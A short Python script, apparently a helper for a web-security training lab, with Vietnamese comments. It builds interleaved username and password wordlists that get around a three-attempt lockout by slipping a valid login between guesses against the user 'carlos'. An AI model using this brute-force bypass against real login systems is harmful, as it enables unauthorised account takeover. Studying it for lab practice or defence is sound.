# Payload dành cho brut-force protection nếu bị giới hạn số lần thử
# TH ở đây y = 3 (là giới hạn nhập fail)
# note.txt là file chứa password để brute-force
with open("note.txt", "r") as file:
    payloadpw = file.read()
listpw = payloadpw.split('\n')
print(listpw)
print(len(listpw))
y = 0
payload = []
for i in listpw:
    y +=1
    print(i)
    payload.append(i)
    if y%2 == 0:
        print("peter")
        payload.append("peter")
print(payload)
with open("passwd.txt", "w") as file:
    file.write("\n".join(str(item) for item in payload))
#Tạo username để brute-force dự trên username đã đoán được
i = 0
y = 0
payload = []
# Dựa trên số lượng password tạo ra - số lượng chèn username hợp lệ sao cho count(passwd) = count(username)
for i in range(100):
    y +=1
    print("carlos")
    payload.append("carlos")
    if y%2 == 0:
        print("wiener")
        payload.append("wiener")
print(payload)
print(len(payload))
with open("username.txt", "w") as file:
    file.write("\n".join(str(item) for item in payload))

